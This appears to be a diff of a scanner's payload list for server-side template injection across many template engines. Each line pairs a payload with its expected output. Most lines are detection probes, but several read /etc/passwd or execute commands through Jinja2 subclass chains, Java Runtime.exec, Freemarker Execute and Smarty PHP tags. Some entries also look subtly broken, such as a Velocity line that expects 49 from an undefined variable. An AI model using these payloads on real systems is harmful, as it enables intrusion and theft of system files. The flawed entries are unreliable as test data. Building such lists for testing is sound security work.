@@ -1,17 +1,77 @@
-Ruby SSTI injection::<%= 7*7 %>::49
-Ruby SSTI injection::#{ 7*7 }::49
-Java SSTI injection::${7*7}::49
-SSTI injection to LFI::<%= File.open('/etc/passwd').read %>::root:
-SSTI injection to LFI::{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}::root:
-SSTI injection to LFI::{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}::root:
-SSTI injection to RCE::{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}::root:
-Java SSTI injection to RCE::${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}::root:
-SSTI injection to RCE::[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}::root:
-Java SSTI injection::${{7*7}}::49
-Twig SSTI injection::{{7*7}}::49
-Jinja2 SSTI injection::[[7*7]]::49
-ASP.NET Razor SSTI injection::@(45+4)::49
-Java SSTI injection::${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}::root:
-Smarty SSTI injection::${'z'.join('ab')}::zab
-Jinja2 SSTI injection::{{7*'7'}}::7777777
-Twig SSTI injection::{{7*'7'}}::49
+Jinja2 basic math::{{7*7}}::49
+Jinja2 string multiplication::{{7*'7'}}::7777777
+Jinja2 array access::{{''.__class__.__mro__[2].__subclasses__()}}::
+Jinja2 config items::{{config.items()}}::
+Jinja2 debug::{{debug()}}::
+Jinja2 url_for::{{url_for.__globals__['__builtins__']}}::
+Jinja2 get_flashed_messages::{{get_flashed_messages.__globals__['__builtins__']}}::
+Jinja2 joiner::{{''.__class__.__mro__[1].__subclasses__()}}::
+Twig basic math::{{7*7}}::49
+Twig string multiplication::{{7*'7'}}::49
+Twig filter test::{{"test"|upper}}::TEST
+Twig array access::{{_self.env}}::
+Twig variable test::{{_self}}::
+Twig nl2br test::{{"test\n"|nl2br}}::test<br />
+Smarty basic math::{$7*7}::49
+Smarty string concatenation::{$'z'.join('ab')}::zab
+Smarty variable test::{$smarty}::
+Smarty config test::{$smarty.version}::
+Smarty comment bypass::{7*7}::49
+Smarty PHP tag::{php}phpinfo();{/php}::phpinfo
+Freemarker basic math::${7*7}::49
+Freemarker string test::${"test"}::test
+Freemarker comment bypass::<#--comment-->${7*7}::49
+Freemarker assign::<#assign x=7*7>${x}::49
+Freemarker builtins::${"test"?upper_case}::TEST
+Freemarker Execute class::<#assign ex="freemarker.template.utility.Execute"?new()>${ex}::
+Mako basic math::${7*7}::49
+Mako string test::${"test"}::test
+Mako variable test::${context}::
+Mako comment bypass::<%doc>comment</%doc>${7*7}::49
+Mako Python code::<%import os%><%x=7*7%>${x}::49
+Velocity basic math::#set($x=7*7)$x::49
+Velocity string test::#set($s="test")$s::test
+Velocity variable test::$context::
+Velocity comment bypass::##comment##$x::49
+Velocity math::#set($x=7*7)${x}::49
+ERB basic math::<%= 7*7 %>::49
+ERB string interpolation::<%= "test" * 3 %>::testtesttest
+ERB variable test::<%= @test %>::
+ERB comment bypass::<%# comment %><%= 7*7 %>::49
+ERB file read::<%= File.open('/etc/passwd').read %>::root:
+Pug basic math::#{7*7}::49
+Pug string test::#{'test'}::test
+Pug variable test::#{variable}::
+Pug comment bypass:://-comment#{7*7}::49
+Nunjucks basic math::{{7*7}}::49
+Nunjucks string multiplication::{{7*'7'}}::7777777
+Nunjucks filter test::{{"test"|upper}}::TEST
+Nunjucks variable test::{{context}}::
+Tornado basic math::{{7*7}}::49
+Tornado escape test::{{escape("test")}}::test
+Tornado variable test::{{handler.application}}::
+Dust basic math::{7*7}::49
+Dust string test::{"test"}::test
+Dust variable test::{variable}::
+Marko basic math::${7*7}::49
+Marko string test::${'test'}::test
+Marko variable test::${input}::
+Slim basic math::#{7*7}::49
+Slim string test::#{'test'}::test
+Slim variable test::#{variable}::
+EJS basic math::<%= 7*7 %>::49
+EJS string test::<%= 'test' %>::test
+EJS variable test::<%= variable %>::
+Java basic math::${7*7}::49
+Java string concatenation::${'z'.join('ab')}::zab
+Java Runtime exec::${T(java.lang.Runtime).getRuntime().exec('id')}::
+Java ProcessBuilder::${T(java.lang.ProcessBuilder).new()}::
+Razor basic math::@(45+4)::49
+Razor string test::@("test")::test
+Razor variable test::@(Model)::
+Razor comment bypass::@*comment*@(7*7)::49
+Generic template syntax::${7*7}::49
+Generic template syntax::{{7*7}}::49
+Generic template syntax::#{7*7}::49
+Generic template syntax::<%= 7*7 %>::49
+Generic template syntax::@{7*7}::49
